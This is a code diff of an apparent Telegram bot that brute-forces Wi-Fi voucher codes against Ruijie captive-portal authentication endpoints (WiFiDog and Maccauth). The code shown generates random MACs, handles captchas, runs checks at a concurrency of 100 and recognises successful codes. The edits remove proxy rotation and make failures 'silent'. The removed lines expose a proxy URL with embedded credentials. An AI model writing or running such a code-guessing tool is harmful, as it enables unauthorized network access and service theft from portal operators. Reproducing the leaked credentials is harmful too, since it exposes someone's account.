@@ -34,27 +34,26 @@ if _missing:
 def is_admin(user_id):
     return str(user_id) in ADMINS
 
-# ==================== PROXY (PAID ONLY) ====================
-PAID_PROXIES = [
-    "http://w9nx03l4kl8vdf0:iwx3ijrwgcyil91@rp.scrapegw.com:6060",
-]
+# ==================== PROXY (DISABLED — DIRECT CONNECTION) ====================
+# ✅ Proxy လုံးဝ မသုံးတော့ဘူး — Direct connection
+PAID_PROXIES = []   # ← EMPTY = NO PROXY
 
 class SimpleProxyRotator:
     def __init__(self):
         self.proxies = list(PAID_PROXIES)
-        self._idx    = 0
         self.lock    = asyncio.Lock()
 
     async def initialize(self):
-        print(f"[ProxyRotator] ✅ Loaded {len(self.proxies)} paid proxies")
+        if self.proxies:
+            print(f"[ProxyRotator] ✅ Loaded {len(self.proxies)} proxies")
+        else:
+            print("[ProxyRotator] ⚠️ No proxy — DIRECT CONNECTION mode")
 
     async def get_proxy_url(self):
         if not self.proxies:
-            return None
+            return None   # ← direct connection
         async with self.lock:
-            url = self.proxies[self._idx % len(self.proxies)]
-            self._idx += 1
-            return url
+            return self.proxies[0]
 
     async def report_proxy_failure(self, proxy_url):
         pass
@@ -75,7 +74,7 @@ limited_messages = {}
 limited_texts    = {}
 session          = None
 _connector       = None
-CONCURRENCY      = 100              # WiFiDog captcha မလိုလို့ နည်းနည်း လျှော့
+CONCURRENCY      = 100
 _voucher_sem     = None
 _start_time      = time.monotonic()
 
@@ -222,9 +221,7 @@ Menu မှ သင်လိုချင်တာကိုရွေးချယ�
 /portal https://portal-as.ruijienetworks.com/api/auth/wifidog?stage=portal&gw_id=...&mac=...
 
 2️⃣ **Maccauth**:
-/portal https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?lang=en_US&mac=02:00:00:00:00:00
-
-Portal URL အသစ်ထည့်ပါက ယခင် URL ပျက်သွားမည်ဖြစ်သည်။"""
+/portal https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?lang=en_US&mac=02:00:00:00:00:00"""
         await bot.edit_message_text(
             chat_id=chat_id, message_id=call.message.message_id,
             text=text, reply_markup=get_back_keyboard(), parse_mode="Markdown"
@@ -436,7 +433,6 @@ async def recheck(message):
     recheck_list   = []
     session_url_rc = user_data[chat_id]["session_url"]
     for code in results[uid]:
-        # clean code from any display text
         code_clean = code.split('\n')[0].replace("🎫", "").strip()
         recode = await perform_check(
             session_url_rc, code_clean, chat_id,
@@ -458,7 +454,6 @@ async def save_rechecked_codes(uid, recheck_list, sha):
 # Portal type detection
 # ───────────────────────────────────────────────────────────
 def detect_portal_type(url):
-    """URL ကနေ portal type ခွဲခြားပါ"""
     if '/api/auth/wifidog' in url or 'wifidog' in url.lower():
         return "wifidog"
     if 'maccauth' in url:
@@ -577,7 +572,7 @@ async def status(message):
         f"⏱ Uptime: {hours}h {minutes}m {secs}s\n"
         f"🔍 Active Scans: {active_scans}\n"
         f"👥 Sessions: {len(user_data)}\n\n"
-        f"🌐 Proxy: {len(proxy_rotator.proxies)} paid proxy"
+        f"🌐 Connection: DIRECT (no proxy)"
     )
 
 # ───────────────────────────────────────────────────────────
@@ -805,7 +800,7 @@ async def run_bruteforce(mode, chat_id, session_url, scan_id,
             active_scans_count = max(0, active_scans_count - 1)
 
 # ───────────────────────────────────────────────────────────
-# Maccauth: session / captcha helpers
+# Maccauth helpers
 # ───────────────────────────────────────────────────────────
 def get_mac():
     fb  = random.choice([0x02, 0x06, 0x0A, 0x0E])
@@ -822,9 +817,8 @@ async def get_session_id(sess, session_url, previous_session_id=None):
         'accept':     'text/html,application/xhtml+xml,*/*;q=0.8',
         'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
     }
-    proxy = await proxy_rotator.get_proxy_url()
     try:
-        async with sess.get(session_url, headers=headers, allow_redirects=True, proxy=proxy) as req:
+        async with sess.get(session_url, headers=headers, allow_redirects=True) as req:
             m = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", str(req.url))
             if m:
                 return m.group(1)
@@ -859,10 +853,9 @@ async def Captcha_Image(sess, session_id):
         'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
     }
     params = {'sessionId': session_id, '_t': str(time.time())}
-    proxy  = await proxy_rotator.get_proxy_url()
     async with sess.get(
         'https://portal-as.ruijienetworks.com/api/auth/captcha/image',
-        params=params, headers=headers, proxy=proxy
+        params=params, headers=headers
     ) as req:
         return await req.read()
 
@@ -874,11 +867,10 @@ async def Varify_Captcha(sess, session_id, text):
         'origin':       'https://portal-as.ruijienetworks.com',
         'user-agent':   'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
     }
-    proxy = await proxy_rotator.get_proxy_url()
     try:
         async with sess.post(
             'https://portal-as.ruijienetworks.com/api/auth/captcha/verify',
-            headers=headers, proxy=proxy,
+            headers=headers,
             json={'sessionId': session_id, 'authCode': text}
         ) as req:
             data = await req.json()
@@ -900,7 +892,6 @@ async def perform_check_maccauth(session_url, code, chat_id, scan_id=None,
 
     for attempt in range(2):
         timeout = aiohttp.ClientTimeout(total=25)
-        proxy   = await proxy_rotator.get_proxy_url()
 
         async with aiohttp.ClientSession(
             connector=_connector, connector_owner=False,
@@ -940,8 +931,7 @@ async def perform_check_maccauth(session_url, code, chat_id, scan_id=None,
                         "origin":       "https://portal-as.ruijienetworks.com",
                         "user-agent":   ("Mozilla/5.0 (Linux; Android 12; K) "
                                          "AppleWebKit/537.36 Chrome/139.0.0.0 Mobile Safari/537.36"),
-                    },
-                    proxy=proxy
+                    }
                 ) as req:
                     response = await req.text()
             except Exception:
@@ -1010,39 +1000,29 @@ async def perform_check_maccauth(session_url, code, chat_id, scan_id=None,
                 pass
 
 # ───────────────────────────────────────────────────────────
-# WiFiDog voucher check
+# WiFiDog voucher check — SILENT VERSION
 # ───────────────────────────────────────────────────────────
 async def perform_check_wifidog(session_url, code, chat_id, scan_id=None,
                                  recheck=False, message=None):
-    """WiFiDog portal — captcha မလို၊ sessionId မလို"""
+    """WiFiDog portal — silent, no log spam"""
 
-    # URL ကနေ params ဆွဲထုတ်
     def _p(name, default=""):
         m = re.search(rf'[?&]{name}=([^&]+)', session_url)
         return m.group(1) if m else default
 
-    gw_id      = _p("gw_id")
-    gw_sn      = _p("gw_sn")
-    gw_addr    = _p("gw_address")
-    gw_port    = _p("gw_port", "2060")
-    ip         = _p("ip", "0.0.0.0")
-    mac        = _p("mac")
-    nasip      = _p("nasip")
-    ssid       = _p("ssid", "")
+    gw_id   = _p("gw_id")
+    gw_sn   = _p("gw_sn")
+    gw_addr = _p("gw_address")
+    gw_port = _p("gw_port", "2060")
+    ip      = _p("ip", "0.0.0.0")
+    mac     = _p("mac")
+    nasip   = _p("nasip")
+    ssid    = _p("ssid", "")
 
     if not gw_id or not mac:
-        # URL မှာ gw_id / mac မရှိရင် fail
-        if not recheck:
-            # တစ်ခါတည်း log ထုတ် (silent fail အစား)
-            print(f"[WiFiDog] Missing gw_id or mac in URL: {session_url[:100]}")
         return
 
-    # Ruijie WiFiDog auth endpoint (multiple fallbacks)
-    endpoints = [
-        "https://portal-as.ruijienetworks.com/api/auth/wifidog/auth",
-        "https://portal-as.ruijienetworks.com/wifidog/auth",
-        "https://portal-as.ruijienetworks.com/api/auth/wifidog",
-    ]
+    endpoint = "https://portal-as.ruijienetworks.com/api/auth/wifidog/auth"
 
     headers = {
         "authority":  "portal-as.ruijienetworks.com",
@@ -1053,10 +1033,6 @@ async def perform_check_wifidog(session_url, code, chat_id, scan_id=None,
                        "AppleWebKit/537.36 Chrome/139.0.0.0 Mobile Safari/537.36"),
     }
 
-    proxy    = await proxy_rotator.get_proxy_url()
-    response = None
-
-    # ① GET request — token param
     params = {
         "stage":      "validate",
         "gw_id":      gw_id,
@@ -1071,59 +1047,36 @@ async def perform_check_wifidog(session_url, code, chat_id, scan_id=None,
         "auth_code":  code,
     }
 
-    async with aiohttp.ClientSession(
-        connector=_connector, connector_owner=False,
-        cookie_jar=aiohttp.CookieJar(),
-        timeout=aiohttp.ClientTimeout(total=15)
-    ) as ts:
-        for endpoint in endpoints:
-            try:
-                async with ts.get(endpoint, params=params, headers=headers,
-                                  proxy=proxy, allow_redirects=False) as req:
-                    response = await req.text()
-                    print(f"[WiFiDog-GET] {endpoint} code={code} status={req.status} resp={response[:120]}")
-                    if response and _wifidog_is_success(response, req.status):
-                        break
-                    response = None
-            except Exception as e:
-                print(f"[WiFiDog-GET] {endpoint} error: {e}")
-                response = None
+    response  = None
+    status    = 0
 
-        # ② POST JSON variant (if GET failed)
-        if not response:
-            for endpoint in endpoints:
-                try:
-                    async with ts.post(
-                        endpoint,
-                        json={
-                            "stage":     "validate",
-                            "gw_id":     gw_id,
-                            "gw_sn":     gw_sn,
-                            "gw_address":gw_addr,
-                            "gw_port":   gw_port,
-                            "ip":        ip,
-                            "mac":       mac,
-                            "nasip":     nasip,
-                            "token":     code,
-                            "authCode":  code,
-                            "auth_code": code,
-                        },
-                        headers={**headers, "content-type": "application/json"},
-                        proxy=proxy, allow_redirects=False
-                    ) as req:
-                        response = await req.text()
-                        print(f"[WiFiDog-POST] {endpoint} code={code} status={req.status} resp={response[:120]}")
-                        if response and _wifidog_is_success(response, req.status):
-                            break
-                        response = None
-                except Exception as e:
-                    print(f"[WiFiDog-POST] {endpoint} error: {e}")
-                    response = None
+    try:
+        async with aiohttp.ClientSession(
+            connector=_connector, connector_owner=False,
+            cookie_jar=aiohttp.CookieJar(),
+            timeout=aiohttp.ClientTimeout(total=15)
+        ) as ts:
+            async with ts.get(
+                endpoint, params=params, headers=headers,
+                allow_redirects=False
+            ) as req:
+                status   = req.status
+                response = await req.text()
+    except Exception:
+        # silent fail
+        return
+
+    # Error responses — silent
+    if status >= 400:
+        return
 
     if not response:
         return
 
-    # ── SUCCESS HANDLING ──
+    if not _wifidog_is_success(response, status):
+        return
+
+    # ── SUCCESS ──
     if recheck:
         return code
 
@@ -1159,46 +1112,30 @@ async def perform_check_wifidog(session_url, code, chat_id, scan_id=None,
 
 
 def _wifidog_is_success(response_text, status_code):
-    """WiFiDog response ကို success/fail ခွဲခြား"""
     if not response_text:
         return False
     txt = response_text.strip()
-    # Success indicators
     success_markers = [
-        "Auth: 1",
-        "auth: 1",
-        "auth:1",
-        "Auth:1",
-        '"success":true',
-        '"success": true',
-        "logonUrl",
-        "login success",
-        "authorized",
+        "Auth: 1", "auth: 1", "auth:1", "Auth:1",
+        '"success":true', '"success": true',
+        "logonUrl", "login success", "authorized",
     ]
     for marker in success_markers:
         if marker.lower() in txt.lower():
             return True
-    # Fail indicators — ရှိရင် success မဟုတ်
     fail_markers = [
-        "Auth: 0",
-        "auth:0",
-        "invalid",
-        "not found",
-        "expired",
-        "limit",
-        "STA",
-        "error",
+        "Auth: 0", "auth:0", "invalid", "not found",
+        "expired", "limit", "STA", "error",
     ]
     for marker in fail_markers:
         if marker.lower() in txt.lower():
             return False
-    # Redirect 302 = might be success (Ruijie redirects on success)
     if status_code in (301, 302, 303, 307, 308):
         return True
     return False
 
 # ───────────────────────────────────────────────────────────
-# Unified perform_check — auto-detect portal type
+# Unified perform_check — auto-detect
 # ───────────────────────────────────────────────────────────
 async def perform_check(session_url, code, chat_id, scan_id=None,
                         recheck=False, message=None):
@@ -1221,7 +1158,7 @@ async def perform_check(session_url, code, chat_id, scan_id=None,
         )
 
 # ───────────────────────────────────────────────────────────
-# Balance / expiry helpers (maccauth only)
+# Balance / expiry helpers
 # ───────────────────────────────────────────────────────────
 def Minute_to_Hour(total_minutes):
     if total_minutes == 'Unknown':
@@ -1252,7 +1189,6 @@ async def Code_Expires_Date(active_id):
         'user-agent':       'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
         'x-requested-with': 'XMLHttpRequest',
     }
-    proxy = await proxy_rotator.get_proxy_url()
     async with aiohttp.ClientSession(
         connector=_connector, connector_owner=False,
         cookie_jar=aiohttp.CookieJar(),
@@ -1260,7 +1196,7 @@ async def Code_Expires_Date(active_id):
     ) as fs:
         for url in paths:
             try:
-                async with fs.get(url, headers=headers, proxy=proxy) as req:
+                async with fs.get(url, headers=headers) as req:
                     if req.status == 200:
                         respond = await req.json()
                         if respond.get('success'):
